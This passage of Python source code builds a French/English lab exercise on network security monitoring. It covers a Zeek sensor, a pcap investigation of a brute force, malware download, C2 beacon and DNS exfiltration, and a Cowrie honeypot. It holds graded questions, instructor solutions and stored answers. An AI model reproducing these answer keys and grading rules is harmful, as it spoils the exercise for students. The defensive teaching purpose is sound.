- le nom du fichier : @@{file:.+}@@
- son empreinte SHA-256 : @@{sha256:[0-9a-fA-F]+}@@

Extrayez aussi le fichier de la capture dans `/root/evidence/extracted/` (sous le nom de votre choix) :
l'évaluation y cherche un fichier de cette empreinte.
""")
            + instructor(tr("""
**Solution.** `{victim}` a téléchargé `{file}` (SHA-256 `{sha}`) : `http.log` (un `GET /uploads/...`
avec le User-Agent `Wget`), `files.log` (`sha256`, avec `local`). Extraction :
`tshark -r {pcap} --export-objects http,/tmp/objets` puis `cp /tmp/objets/{file} {dir}/` (l'objet du
dépôt `POST /admin/upload` est un formulaire multipart, pas le fichier seul).
""").format(victim=inc["victim"], file=inc["dropper"], sha=inc["sha256"], pcap=INCIDENT_PCAP, dir=EXTRACTED_DIR)),
            cheat_answers={"final": q3c_answers, "part3_investigation": q3c_answers},
        )
        self.add_grade_element(
            title=no_tr("q_download"), max_grade=5, grade_part=part3,
            grade=int(_same_ip(q3c.get("victim"), inc["victim"])) + int(_norm(q3c.get("file")) == inc["dropper"].lower())
            + 3 * int(_norm(q3c.get("sha256")) == inc["sha256"]),
            description=tr("le poste (1), le nom du fichier (1), son SHA-256 (3)"))
        self.add_grade_element(
            title=no_tr("extracted_file"), max_grade=2, grade_part=part3,
            grade=2 * int(inc["sha256"] in (extracted or "")),
            description=tr("un fichier de /root/evidence/extracted a le SHA-256 du fichier malveillant"))

        q3d_answers = {"c2_domain": inc["c2_domain"], "c2_ip": inc["c2_ip"], "period": str(inc["period"])}
        q3d = self.question_form(
            section=self.section(0),
            title=tr("La balise"),
            hash="eea145e06b159e95",
            description=tr("""
Le poste compromis contacte ensuite régulièrement un serveur de commande et contrôle (C2).

- le nom de domaine du C2 : @@{c2_domain:.+}@@
- son adresse IP : @@{c2_ip:[0-9.]+}@@
- la période de ses requêtes, en secondes (à une seconde près) : @@{period:[0-9.,]+}@@
""")
            + instructor(tr("""
**Solution.** `{domain}` (`{ip}`, la réponse de `dns.log`), une requête `GET /api/v2/ping` toutes les
{period} s (User-Agent `{ua}`) :
`jq -r 'select(.host == "{domain}") | .ts' http.log | awk 'NR > 1 {{print $1 - p}} {{p = $1}}'`.
""").format(domain=inc["c2_domain"], ip=inc["c2_ip"], period=inc["period"], ua=BEACON_UA)),
            cheat_answers={"final": q3d_answers, "part3_investigation": q3d_answers},
        )
        period = _number(q3d.get("period"))
        self.add_grade_element(
            title=no_tr("q_c2"), max_grade=5, grade_part=part3,
            grade=2 * int(_norm(q3d.get("c2_domain")).rstrip(".") == inc["c2_domain"])
            + int(_same_ip(q3d.get("c2_ip"), inc["c2_ip"]))
            + 2 * int(period is not None and abs(period - inc["period"]) <= 1.0),
            description=tr("le domaine du C2 (2), son adresse (1), la période (2)"))

        q3e_answers = {"exfil_domain": inc["exfil_domain"], "code": inc["code"]}
        q3e = self.question_form(
            section=self.section(0),
            title=tr("L'exfiltration"),
            hash="d8dacdbe7ba6a50c",
            description=tr("""
Des données sont sorties du réseau sans connexion HTTP.

- le domaine qui reçoit les données : @@{exfil_domain:.+}@@
- la valeur de `code=` dans les données exfiltrées : @@{code:.+}@@
""")
            + instructor(tr("""
**Solution.** Le domaine `{domain}` : des requêtes DNS `<hexadécimal>.<n>.{domain}` (réponses
NXDOMAIN). Les données : `{secret}`, donc le code `{code}` :
`jq -r 'select(.query | endswith("{domain}")) | .query' dns.log | cut -d. -f1 | tr -d '\\n' | xxd -r -p`.
""").format(domain=inc["exfil_domain"], secret=inc["secret"], code=inc["code"])),
            cheat_answers={"final": q3e_answers, "part3_investigation": q3e_answers},
        )
        self.add_grade_element(
            title=no_tr("q_exfil"), max_grade=4, grade_part=part3,
            grade=2 * int(_norm(q3e.get("exfil_domain")).rstrip(".") == inc["exfil_domain"])
            + 2 * int(_norm(q3e.get("code")) == inc["code"].lower()),
            description=tr("le domaine de l'exfiltration (2), le code (2)"))

        # =====================================================================
        # Part 4 — the Cowrie honeypot
        # =====================================================================
        part4 = self.add_grade_part(no_tr("part4"), tr("Partie 4 — Le pot de miel Cowrie"))
        p1, p2, p3 = hpd["root_passwords"]

        self.question_dummy(
            section=self.section(0),
            title=tr("Déployer Cowrie"),
            hash="ec855d4bd5f4b4e5",
            description=tr("""
Sur `honeypot` (sections @@ref:honeypot@@ et @@ref:cowrie@@), faites de la machine un pot de miel
crédible :

1. déplacez le vrai serveur SSH sur le port **{admin}**, et n'ouvrez ce port qu'au réseau `lan`
   (`{lan}`) : depuis `wan`, il doit être fermé ;
2. faites répondre **Cowrie** sur le port **22** ;
3. son identité, dans `cowrie.cfg` : le nom d'hôte `{hostname}`, la bannière SSH `{banner}`, la version
   du noyau `{kernel}` (ce qu'affiche `uname -r`), le nom de sonde `{sensor}` ;
4. ses comptes, dans `userdb.txt` : `root` accepté avec `{p1}`, `{p2}` ou `{p3}`, et **aucun autre** mot
   de passe ; `{user2}` accepté avec n'importe quel mot de passe **sauf** `{refused}` ; tout autre compte
   refusé ;
5. Cowrie lancé par systemd, sous l'utilisateur `cowrie`, et activé au démarrage.

Testez depuis `attacker` (`ssh root@honeypot`, puis `hostname`, `uname -a`, `ls`...) en suivant
`cowrie.json`, et depuis `analyst` : `ssh -p {admin} student@honeypot`. L'évaluation se connecte depuis
`wan` aux ports 22 et {admin} avec des comptes justes et faux, et depuis `analyst` au port {admin}.
""").format(admin=ADMIN_PORT, lan=d.nets.lan, hostname=hpd["hostname"], banner=FAKE_BANNER, kernel=hpd["kernel"],
            sensor=hpd["sensor"], p1=p1, p2=p2, p3=p3, user2=hpd["user2"], refused=hpd["user2_refused"])
            + instructor(tr("""
**Solution.** Le vrai `sshd` : `{dropin}` contenant `Port {admin}`, puis `systemctl restart ssh`. Le pare-feu
`{nft}` (puis `nft -f {nft}` et `systemctl enable nftables`) :
""").format(dropin=SSHD_DROPIN, admin=ADMIN_PORT, nft=NFT_CONF) + no_tr(_block(self.net_scheme.nft_text())) + tr("""
`{cfg}` (seules les clés changées ; ou les mêmes valeurs dans le fichier complet) :
""").format(cfg=hp.COWRIE_CFG) + no_tr(_block(self.net_scheme.cowrie_cfg_text())) + tr("`{userdb}` :").format(
                userdb=hp.USERDB) + no_tr(_block(self.net_scheme.userdb_text())) + tr("""
puis `systemctl enable --now cowrie` (ou `restart`). Une tentative qu'aucune règle ne reconnaît est
refusée : `root:x:!*` ne fait que le dire explicitement. Sans `userdb.txt`, Cowrie applique
`userdb.example`, qui accepte presque tout (`*:x:*`).
""")),
        )
        self.add_grade_element(
            title=no_tr("admin_port_lan"), max_grade=2, grade_part=part4, grade=2 * int(admin_lan_ok),
            description=tr("le vrai serveur SSH répond sur le port 22222 depuis lan"))
        self.add_grade_element(
            title=no_tr("admin_port_wan_closed"), max_grade=2, grade_part=part4,
            grade=2 * int(admin_lan_ok and not wan_admin),
            description=tr("le port 22222 est fermé depuis wan"))
        self.add_grade_element(
            title=no_tr("cowrie_banner"), max_grade=3, grade_part=part4, grade=3 * int(banner22 == FAKE_BANNER),
            description=tr("le port 22 envoie la bannière demandée (Cowrie)"))
        self.add_grade_element(
            title=no_tr("cowrie_user"), max_grade=3, grade_part=part4,
            grade=2 * int(bool(owners) and all(o == "cowrie" for o in owners)) + int(enabled and bool(owners)),
            description=tr("Cowrie tourne sous l'utilisateur cowrie (2), le service est activé (1)"))
        self.add_grade_element(
            title=no_tr("cowrie_identity"), max_grade=6, grade_part=part4,
            grade=2 * int(len(lines) >= 1 and lines[0] == hpd["hostname"])
            + 2 * int(len(lines) >= 2 and lines[1] == hpd["kernel"]) + 2 * int(sensors == {hpd["sensor"]}),
            description=tr("le nom d'hôte (2), la version du noyau (2), le nom de sonde des événements (2)"))
        self.add_grade_element(
            title=no_tr("cowrie_userdb"), max_grade=7, grade_part=part4,
            grade=int(login('root_ok') == "success") + 2 * int(login('root_bad') == "failed")
            + int(login('user2_ok') == "success") + 2 * int(login('user2_bad') == "failed")
            + int(login('unknown') == "failed"),
            description=tr("root avec un mot de passe de la liste (1), refusé avec un autre (2) ; le second compte "
                           "avec un mot de passe quelconque (1), refusé avec le mot de passe exclu (2) ; un compte "
                           "inconnu refusé (1)"))

        q4_answers = {"level": "medium", "suspicious": "no-use", "risk": "pivot"}
        q4 = self.question_form(
            section=self.section(0),
            title=tr("Les pots de miel"),
            hash="6b655a5c7af8885e",
            description=tr("""
- Cowrie est un pot de miel à interaction... @@{level:>moyenne : il émule un shell, rien n'est réellement exécuté>>>medium|haute : c'est un vrai système>>>high|basse : il note seulement les connexions>>>low}@@
- pourquoi toute connexion à un pot de miel est-elle suspecte ? @@{suspicious:>il n'offre aucun service légitime : personne n'a de raison de s'y connecter>>>no-use|son adresse est secrète>>>secret|il n'accepte que les attaquants>>>attackers}@@
- le principal risque d'un pot de miel mal isolé ? @@{risk:>servir de rebond vers d'autres machines : filtrer ses connexions sortantes>>>pivot|qu'il soit trop lent>>>slow|qu'il refuse les attaquants>>>refuse}@@
""")
            + instructor(tr("""
**Solution.** Interaction moyenne (un shell et un système de fichiers émulés). Aucun usage légitime :
toute connexion est suspecte, d'où l'absence de faux positif. Le risque : un rebond, d'où le filtrage
des connexions sortantes et la surveillance du pot de miel lui-même (partie 2).
""")),
            cheat_answers={"final": q4_answers, "part4_honeypot": q4_answers},
        )
        self.add_grade_element(
            title=no_tr("q_honeypot"), max_grade=4, grade_part=part4, scope=params.EXO_EVAL_SCOPE,
            grade=2 * int(_norm(q4.get("level")) == "medium") + int(_norm(q4.get("suspicious")) == "no-use")
            + int(_norm(q4.get("risk")) == "pivot"),
            description=tr("interaction moyenne ; aucun usage légitime ; risque de rebond"))

        # =====================================================================
        # Part 5 — correlation of the Cowrie and Zeek logs
        # =====================================================================
        part5 = self.add_grade_part(no_tr("part5"), tr("Partie 5 — Corréler les journaux du pot de miel"))
        ans = hist["answers"]

        self.question_dummy(
            section=self.section(0),
            title=tr("Les journaux d'hier"),
            hash="f06ae5467eca938f",
            description=tr("""
Le pot de miel de production (la sonde `{sensor}`) a été attaqué hier. Sur `analyst`, `{cowrie}` est son
journal Cowrie de la journée, et `{conn}` le `conn.log` de la sonde Zeek de la DMZ pour la même journée
(format JSON). Répondez avec `jq` (sections @@ref:cowrie-logs@@ et @@ref:correlation@@) : le premier
journal raconte les sessions, le second les connexions, et seul le croisement des deux répond aux
dernières questions.
""").format(sensor=hist["sensor"], cowrie=HISTORY_COWRIE, conn=HISTORY_CONN),
        )

        q5a_answers = {"n_ips": str(ans["n_ips"]), "top_ip": ans["top_ip"], "top_version": ans["top_version"]}
        q5a = self.question_form(
            section=self.section(0),
            title=tr("Les attaquants"),
            hash="acb6be6e1fca96b2",
            description=tr("""
- combien d'adresses différentes ont tenté au moins une authentification ? @@{n_ips:[0-9]+}@@
- l'adresse qui a échoué le plus souvent : @@{top_ip:[0-9.]+}@@
- le logiciel client qu'elle utilisait (le champ `version`, tel quel) : @@{top_version:.+}@@
""")
            + instructor(tr("""
**Solution.** {n} adresses (les deux autres ne font que lire la bannière) :
`jq -r 'select(.eventid | startswith("cowrie.login")) | .src_ip' {cowrie} | sort -u | wc -l`.
La plus active : `{top}` (`... select(.eventid == "cowrie.login.failed") ... | uniq -c | sort -rn`),
avec le client `{version}` (`select(.src_ip == "{top}" and .eventid == "cowrie.client.version")`).
""").format(n=ans["n_ips"], cowrie=HISTORY_COWRIE, top=ans["top_ip"], version=ans["top_version"])),
            cheat_answers={"final": q5a_answers, "part5_correlation": q5a_answers},
        )
        n_ips = _number(q5a.get("n_ips"))
        self.add_grade_element(
            title=no_tr("q_attackers"), max_grade=7, grade_part=part5,
            grade=3 * int(n_ips is not None and n_ips == ans["n_ips"]) + 2 * int(_same_ip(q5a.get("top_ip"), ans["top_ip"]))
            + 2 * int(" ".join(str(q5a.get("top_version") or "").split()) == ans["top_version"]),
            description=tr("le nombre d'adresses (3), l'adresse la plus active (2) et son client (2)"))

        q5b_answers = {"url": ans["url"], "sha256": ans["sha256"], "key_comment": ans["key_comment"],
                       "ssh_uid": ans["ssh_uid"], "out_uid": ans["out_uid"]}
        q5b = self.question_form(
            section=self.section(0),
            title=tr("La compromission"),
            hash="16b8eb917ff8e20d",
            description=tr("""
Un attaquant a réussi à se connecter, a téléchargé un programme et s'est ménagé un accès durable.

- l'URL du programme téléchargé : @@{url:.+}@@
- son SHA-256 : @@{sha256:[0-9a-fA-F]+}@@
- le commentaire de la clé SSH ajoutée par l'attaquant (le dernier mot de la clé) : @@{key_comment:.+}@@
- l'`uid` Zeek de la connexion SSH de cette session : @@{ssh_uid:C[0-9A-Za-z]+}@@
- l'`uid` Zeek de la connexion que le pot de miel a ouverte pour télécharger le programme : @@{out_uid:C[0-9A-Za-z]+}@@
""")
            + instructor(tr("""
**Solution.** La session `{session}` : `{url}` (SHA-256 `{sha}`,
`select(.eventid == "cowrie.session.file_download")`), la clé de commentaire `{comment}` (les
`cowrie.command.input` de la session). Corrélation : l'adresse et le port source de la session
(`cowrie.session.connect`) désignent dans `{conn}` la connexion `{ssh_uid}` (port 22 pour la sonde,
2222 pour Cowrie) ; la connexion sortante du pot de miel vers l'hôte de l'URL, au moment du
téléchargement, est `{out_uid}`.
""").format(session=ans["session"], url=ans["url"], sha=ans["sha256"], comment=ans["key_comment"], conn=HISTORY_CONN,
            ssh_uid=ans["ssh_uid"], out_uid=ans["out_uid"])),
            cheat_answers={"final": q5b_answers, "part5_correlation": q5b_answers},
        )
        self.add_grade_element(
            title=no_tr("q_compromise"), max_grade=10, grade_part=part5,
            grade=2 * int(str(q5b.get("url") or "").strip() == ans["url"])
            + 2 * int(_norm(q5b.get("sha256")) == ans["sha256"])
            + 2 * int(str(q5b.get("key_comment") or "").strip() == ans["key_comment"])
            + 2 * int(str(q5b.get("ssh_uid") or "").strip() == ans["ssh_uid"])
            + 2 * int(str(q5b.get("out_uid") or "").strip() == ans["out_uid"]),
            description=tr("l'URL (2), le SHA-256 (2), le commentaire de la clé (2), l'uid SSH (2), l'uid sortant (2)"))

        # =====================================================================
        # Bonus — the Intel framework
        # =====================================================================
        bonus = self.add_grade_part(no_tr("bonus"), tr("Bonus — Le cadre Intel"))
        indicators = intel_indicators(d)
        hits = zeek.intel_hits(intel_run['logs'].get('intel', []))

        self.question_dummy(
            section=self.section(0),
            title=tr("Les indicateurs du CERT"),
            hash="5be6957e312a84b3",
            description=tr("""
Le CERT vous transmet trois indicateurs de compromission : le domaine `{domain}`, l'adresse `{addr}` et
l'URL `http://{url}`. Sur `sensor` (section @@ref:intel@@) :

1. écrivez `{intel}` avec ces trois indicateurs (la source et la description sont libres) ;
2. dans `local.zeek`, chargez `frameworks/intel/seen` et ce fichier (`Intel::read_files`).

Si la sonde de la partie 1 tourne, `zeekctl deploy` : une requête `dig @www {domain}` depuis `analyst`
doit apparaître dans `intel.log`. L'évaluation rejoue hors ligne une capture contenant les trois
indicateurs, avec `zeek --pseudo-realtime=1 -r ... local` : elle ne dépend pas de la partie 1.
""").format(domain=indicators[0][0], addr=indicators[1][0], url=indicators[2][0], intel=INTEL_FILE)
            + instructor(tr("""
**Solution.** `{intel}` (des tabulations entre les champs) :
""").format(intel=INTEL_FILE) + no_tr(_block(self.net_scheme.intel_text())) + tr("et à la fin de `{local}` :").format(
                local=zeek.LOCAL_ZEEK) + no_tr(_block("\n".join(self.net_scheme.intel_lines())))),
        )
        for (indicator, kind, where), label in zip(indicators, ("intel_domain", "intel_addr", "intel_url")):
            self.add_grade_element(
                title=no_tr(label), max_grade=2, grade_part=bonus, bonus=True,
                grade=2 * int(where in hits.get(indicator, [])),
                description=tr("intel.log reconnaît l'indicateur {kind}").format(kind=kind))


_TRANSLATIONS = {
    'en': {
        """
**Pour l'enseignant.** Chaque question se termine par sa solution, calculée pour ce projet. L'état
`final` applique toute la solution (ré-applicable) et remplit les formulaires ; les états `part1_sensor`
... `bonus_intel` appliquent une partie seule (vérification de l'indépendance).

La sonde cachée (`probe`, sur `wan`) : `{first}` envoie une requête HTTP (`{page}`) et une requête DNS
(`{qname}`) vers `www` (partie 1) ; `{second}` lit les bannières des ports 22 et {admin} de `honeypot` et
ouvre cinq sessions SSH sur le port 22 (partie 4). `analyst` fait une requête HTTP vers `www` (partie 1)
et lit la bannière du port {admin} (partie 4). Les journaux de Zeek sont lus {wait} s plus tard.

Les parties 2 et bonus sont notées hors ligne sur `sensor` : à chaque évaluation une capture neuve est
écrite (`lib/suricata_pcap.py`, d'autres adresses que `{training}`), puis lue par `zeek -C -r` avec un
script seul (partie 2) ou avec `local` et `--pseudo-realtime=1` (bonus).
""":
            """
**For the instructor.** Each question ends with its solution, computed for this project. The `final`
state applies the whole solution (it can be applied again) and fills in the forms; the states
`part1_sensor` ... `bonus_intel` apply one part alone (to check that the parts are independent).

The hidden probe (`probe`, on `wan`): `{first}` sends an HTTP request (`{page}`) and a DNS query
(`{qname}`) to `www` (part 1); `{second}` reads the banners of ports 22 and {admin} of `honeypot` and
opens five SSH sessions on port 22 (part 4). `analyst` sends an HTTP request to `www` (part 1) and reads
the banner of port {admin} (part 4). The Zeek logs are read {wait} s later.

Part 2 and the bonus are graded offline on `sensor`: at each evaluation a fresh capture is written
(`lib/suricata_pcap.py`, other addresses than `{training}`), then read by `zeek -C -r` with one script
alone (part 2) or with `local` and `--pseudo-realtime=1` (bonus).
""",
        """
**Solution.** `{node}` :
""":
            """
**Solution.** `{node}`:
""",
        "`{nets}` :":
            "`{nets}`:",
        """
puis à la fin de `{local}` les lignes `{load}` et `{private}` (sans elle, `wan`, dans 198.18.0.0/15,
est local : `local_orig` vaut T pour la sonde cachée), et `zeekctl deploy`. L'état `final` le fait par :
""":
            """
then, at the end of `{local}`, the lines `{load}` and `{private}` (without it, `wan`, in 198.18.0.0/15,
is local: `local_orig` is T for the hidden probe), and `zeekctl deploy`. The `final` state does it with:
""",
        """
**Solution.** L'`uid` identifie une connexion et relie ses lignes dans tous les journaux.
`networks.cfg` remplit `Site::local_nets` : `local_orig` / `local_resp`, donc le sens de chaque connexion.
D'une session TLS, Zeek ne voit que les métadonnées (`ssl.log`, `x509.log`).
""":
            """
**Solution.** The `uid` identifies a connection and links its lines in every log. `networks.cfg` fills
`Site::local_nets`: `local_orig` / `local_resp`, hence the direction of each connection. Of a TLS
session, Zeek only sees the metadata (`ssl.log`, `x509.log`).
""",
        """
**Solution** (`{web}`) :
""":
            """
**Solution** (`{web}`):
""",
        """
`&create_expire=2min` : la fenêtre commence à la première 404 (avec `&write_expire`, une 404 toutes les
40 s prolongerait l'entrée indéfiniment) ; `==` plutôt que `>=` : une seule notice. Et `{hpf}` :
""":
            """
`&create_expire=2min`: the window starts at the first 404 (with `&write_expire`, one 404 every 40 s
would keep the entry alive forever); `==` rather than `>=`: a single notice. And `{hpf}`:
""",
        """
`new_connection` voit aussi l'UDP et l'ICMP (`connection_established` ne voit que le TCP établi, et
`http_request` que le HTTP). Les erreurs des exécutions hors ligne sont gardées dans l'archive.
""":
            """
`new_connection` also sees UDP and ICMP (`connection_established` only sees established TCP, and
`http_request` only HTTP). The errors of the offline runs are kept in the archive.
""",
        """
**Pour l'enseignant.** La chronologie de la capture (`{pcap}`, générée par `lib/incident_pcap.py`) :
balayage SYN de `files` par `{scanner}` à +60 s ; {count} `POST /login` sur `intranet` (User-Agent
Hydra) à partir de +150 s, la dernière réussie (302 + cookie), puis `GET /accueil` et le dépôt du fichier
(`POST /admin/upload`) ; à +330 s, `{victim}` télécharge `/uploads/{dropper}` (Wget) ; de +338 s, une
requête vers le C2 toutes les {period} s ({beacons} fois) ; vers +338 + 3,5 × {period} s, l'exfiltration
DNS. Le reste est du trafic de fond (navigation des postes).
""":
            """
**For the instructor.** The timeline of the capture (`{pcap}`, generated by `lib/incident_pcap.py`): SYN
scan of `files` by `{scanner}` at +60 s; {count} `POST /login` to `intranet` (Hydra User-Agent) from
+150 s, the last one successful (302 + cookie), then `GET /accueil` and the upload of the file
(`POST /admin/upload`); at +330 s, `{victim}` downloads `/uploads/{dropper}` (Wget); from +338 s, one
request to the C2 every {period} s ({beacons} times); around +338 + 3.5 × {period} s, the DNS
exfiltration. The rest is background traffic (the workstations browsing).
""",
        """
**Solution.** `{scanner}` ; ports ouverts : `{ports}`. Dans `conn.log`, les connexions de `{scanner}` vers
`{files}` : les ports fermés sont en `REJ`, les ouverts ont l'histoire `ShR` (le SYN-ACK de `files` puis
le RST du scanner) :
`jq -r 'select(."id.resp_h" == "{files}" and .history == "ShR") | ."id.resp_p"' conn.log | sort -n`
(avec tshark : `-Y 'tcp.flags.syn == 1 and tcp.flags.ack == 1 and ip.src == {files}'`).
""":
            """
**Solution.** `{scanner}`; open ports: `{ports}`. In `conn.log`, the connections from `{scanner}` to
`{files}`: the closed ports are `REJ`, the open ones have the history `ShR` (the SYN-ACK of `files`, then
the scanner's RST):
`jq -r 'select(."id.resp_h" == "{files}" and .history == "ShR") | ."id.resp_p"' conn.log | sort -n`
(with tshark: `-Y 'tcp.flags.syn == 1 and tcp.flags.ack == 1 and ip.src == {files}'`).
""",
        """
**Solution.** Le compte `{account}`, le mot de passe `{password}` : la seule requête `POST /login`
suivie d'une réponse 302 (les autres reçoivent 401). Dans `http.log` : `status_code` 302 ; les champs du
formulaire avec tshark (`-Y urlencoded-form -T fields -e urlencoded-form.value`, décodés), ou le flux
TCP (`%21` pour `!`, `%23` pour `#`).
""":
            """
**Solution.** The account `{account}`, the password `{password}`: the only `POST /login` request
followed by a 302 answer (the others get 401). In `http.log`: `status_code` 302; the fields of the form
with tshark (`-Y urlencoded-form -T fields -e urlencoded-form.value`, decoded), or the TCP stream (`%21`
for `!`, `%23` for `#`).
""",
        """
**Solution.** `{victim}` a téléchargé `{file}` (SHA-256 `{sha}`) : `http.log` (un `GET /uploads/...`
avec le User-Agent `Wget`), `files.log` (`sha256`, avec `local`). Extraction :
`tshark -r {pcap} --export-objects http,/tmp/objets` puis `cp /tmp/objets/{file} {dir}/` (l'objet du
dépôt `POST /admin/upload` est un formulaire multipart, pas le fichier seul).
""":
            """
**Solution.** `{victim}` downloaded `{file}` (SHA-256 `{sha}`): `http.log` (a `GET /uploads/...` with
the User-Agent `Wget`), `files.log` (`sha256`, with `local`). Extraction:
`tshark -r {pcap} --export-objects http,/tmp/objets` then `cp /tmp/objets/{file} {dir}/` (the object of
the upload `POST /admin/upload` is a multipart form, not the file alone).
""",
        """
**Solution.** `{domain}` (`{ip}`, la réponse de `dns.log`), une requête `GET /api/v2/ping` toutes les
{period} s (User-Agent `{ua}`) :
`jq -r 'select(.host == "{domain}") | .ts' http.log | awk 'NR > 1 {{print $1 - p}} {{p = $1}}'`.
""":
            """
**Solution.** `{domain}` (`{ip}`, the answer in `dns.log`), one `GET /api/v2/ping` request every
{period} s (User-Agent `{ua}`):
`jq -r 'select(.host == "{domain}") | .ts' http.log | awk 'NR > 1 {{print $1 - p}} {{p = $1}}'`.
""",
        """
**Solution.** Le domaine `{domain}` : des requêtes DNS `<hexadécimal>.<n>.{domain}` (réponses
NXDOMAIN). Les données : `{secret}`, donc le code `{code}` :
`jq -r 'select(.query | endswith("{domain}")) | .query' dns.log | cut -d. -f1 | tr -d '\\n' | xxd -r -p`.
""":
            """
**Solution.** The domain `{domain}`: DNS queries `<hexadecimal>.<n>.{domain}` (NXDOMAIN answers). The
data: `{secret}`, hence the code `{code}`:
`jq -r 'select(.query | endswith("{domain}")) | .query' dns.log | cut -d. -f1 | tr -d '\\n' | xxd -r -p`.
""",
        """
**Solution.** Le vrai `sshd` : `{dropin}` contenant `Port {admin}`, puis `systemctl restart ssh`. Le pare-feu
`{nft}` (puis `nft -f {nft}` et `systemctl enable nftables`) :
""":
            """
**Solution.** The real `sshd`: `{dropin}` holding `Port {admin}`, then `systemctl restart ssh`. The
firewall `{nft}` (then `nft -f {nft}` and `systemctl enable nftables`):
""",
        """
`{cfg}` (seules les clés changées ; ou les mêmes valeurs dans le fichier complet) :
""":
            """
`{cfg}` (only the keys changed; or the same values in the whole file):
""",
        "`{userdb}` :":
            "`{userdb}`:",
        """
puis `systemctl enable --now cowrie` (ou `restart`). Une tentative qu'aucune règle ne reconnaît est
refusée : `root:x:!*` ne fait que le dire explicitement. Sans `userdb.txt`, Cowrie applique
`userdb.example`, qui accepte presque tout (`*:x:*`).
""":
            """
then `systemctl enable --now cowrie` (or `restart`). An attempt that no rule matches is refused:
`root:x:!*` only says it explicitly. Without `userdb.txt`, Cowrie applies `userdb.example`, which accepts
almost everything (`*:x:*`).
""",
        """
**Solution.** Interaction moyenne (un shell et un système de fichiers émulés). Aucun usage légitime :
toute connexion est suspecte, d'où l'absence de faux positif. Le risque : un rebond, d'où le filtrage
des connexions sortantes et la surveillance du pot de miel lui-même (partie 2).
""":
            """
**Solution.** Medium interaction (an emulated shell and file system). No legitimate use: every
connection is suspicious, hence no false positive. The risk: a pivot, hence the filtering of the outgoing
connections and the monitoring of the honeypot itself (part 2).
""",
        """
**Solution.** {n} adresses (les deux autres ne font que lire la bannière) :
`jq -r 'select(.eventid | startswith("cowrie.login")) | .src_ip' {cowrie} | sort -u | wc -l`.
La plus active : `{top}` (`... select(.eventid == "cowrie.login.failed") ... | uniq -c | sort -rn`),
avec le client `{version}` (`select(.src_ip == "{top}" and .eventid == "cowrie.client.version")`).
""":
            """
**Solution.** {n} addresses (the two others only read the banner):
`jq -r 'select(.eventid | startswith("cowrie.login")) | .src_ip' {cowrie} | sort -u | wc -l`.
The most active one: `{top}` (`... select(.eventid == "cowrie.login.failed") ... | uniq -c | sort -rn`),
with the client `{version}` (`select(.src_ip == "{top}" and .eventid == "cowrie.client.version")`).
""",
        """
**Solution.** La session `{session}` : `{url}` (SHA-256 `{sha}`,
`select(.eventid == "cowrie.session.file_download")`), la clé de commentaire `{comment}` (les
`cowrie.command.input` de la session). Corrélation : l'adresse et le port source de la session
(`cowrie.session.connect`) désignent dans `{conn}` la connexion `{ssh_uid}` (port 22 pour la sonde,
2222 pour Cowrie) ; la connexion sortante du pot de miel vers l'hôte de l'URL, au moment du
téléchargement, est `{out_uid}`.
""":
            """
**Solution.** The session `{session}`: `{url}` (SHA-256 `{sha}`,
`select(.eventid == "cowrie.session.file_download")`), the key with the comment `{comment}` (the
`cowrie.command.input` of the session). Correlation: the source address and port of the session
(`cowrie.session.connect`) point in `{conn}` to the connection `{ssh_uid}` (port 22 for the sensor, 2222
for Cowrie); the outgoing connection of the honeypot to the host of the URL, at the time of the download,
is `{out_uid}`.
""",
        """
**Solution.** `{intel}` (des tabulations entre les champs) :
""":
            """
**Solution.** `{intel}` (tabs between the fields):
""",
        "et à la fin de `{local}` :":
            "and at the end of `{local}`:",
        "Supervision de sécurité et investigation réseau : Zeek, analyse de capture, Cowrie": "Network security monitoring and forensics: Zeek, a pcap investigation, Cowrie",
        """**Sommaire**

""": """**Contents**

""",
        "La supervision de sécurité réseau": "Network security monitoring",
        """

La **supervision de sécurité réseau** (*Network Security Monitoring*, NSM) consiste à **collecter**,
**analyser** et **conserver** des traces de l'activité du réseau, pour détecter les intrusions et pour
pouvoir, après coup, reconstituer ce qui s'est passé. Elle part d'un constat : la prévention finit
toujours par échouer un jour ; il faut alors **voir** l'attaquant une fois entré, et avoir gardé de quoi
enquêter.

Les traces, de la plus volumineuse à la plus légère :

| type | exemple | ce qu'on en tire | conservation |
|------|---------|------------------|--------------|
| contenu complet | une capture `pcap` (tcpdump, Wireshark) | tout, y compris les fichiers transférés | heures, jours |
| transactions | les journaux de Zeek (`http.log`, `dns.log`...) | qui a demandé quoi, à qui, avec quelle réponse | mois |
| sessions, flux | `conn.log` de Zeek, NetFlow / IPFIX | qui a parlé à qui, combien, combien de temps | mois, années |
| alertes | Suricata, les *notices* de Zeek | ce qu'une règle a jugé suspect | années |

Une alerte seule dit rarement tout : l'analyste remonte de l'alerte aux transactions et aux sessions,
puis au contenu quand il l'a encore. Un IDS à signatures (Suricata) cherche ce qu'on lui a décrit ;
**Zeek** décrit tout ce qu'il voit, ce qui permet de chercher après coup ce qu'on ne savait pas encore
chercher (la *chasse aux menaces*, *threat hunting*). Les deux se complètent.

La sonde reçoit une **copie** du trafic (un port miroir, un TAP, ou ici un concentrateur) sur une
interface **sans adresse** : elle n'émet rien sur le réseau observé et s'administre par une autre
interface.
""": """

**Network security monitoring** (NSM) means **collecting**, **analysing** and **keeping** traces of
the network's activity, to detect intrusions and to be able to reconstruct, after the fact, what
happened. It starts from an observation: prevention always fails one day; you must then **see** the
attacker once inside, and have kept enough to investigate.

The traces, from the bulkiest to the lightest:

| type | example | what it tells | retention |
|------|---------|---------------|-----------|
| full content | a `pcap` capture (tcpdump, Wireshark) | everything, including the transferred files | hours, days |
| transactions | the Zeek logs (`http.log`, `dns.log`...) | who asked for what, from whom, with which answer | months |
| sessions, flows | Zeek's `conn.log`, NetFlow / IPFIX | who talked to whom, how much, for how long | months, years |
| alerts | Suricata, Zeek's *notices* | what a rule judged suspicious | years |

An alert alone rarely tells the whole story: the analyst goes back from the alert to the transactions
and the sessions, then to the content while it is still available. A signature-based IDS (Suricata)
looks for what it has been told about; **Zeek** describes everything it sees, which makes it possible to
search afterwards for what you did not yet know you had to look for (*threat hunting*). The two
complement each other.

The sensor receives a **copy** of the traffic (a mirror port, a TAP, or here a hub) on an interface
**without an address**: it sends nothing on the monitored network and is managed through another
interface.
""",
        "Réponse à incident et preuves": "Incident response and evidence",
        """

Le guide NIST SP 800-61 découpe la réponse à un incident en phases : **préparation** (sondes, journaux,
procédures), **détection et analyse**, **confinement**, **éradication** et **rétablissement**, puis
**retour d'expérience**. Ce TP traite surtout de la détection et de l'analyse : établir ce qui s'est
passé, quand, depuis où, et ce qui a été touché.

Les règles d'une investigation (*forensics*) :

- **ne jamais travailler sur l'original** : copier la preuve, calculer son empreinte à la collecte
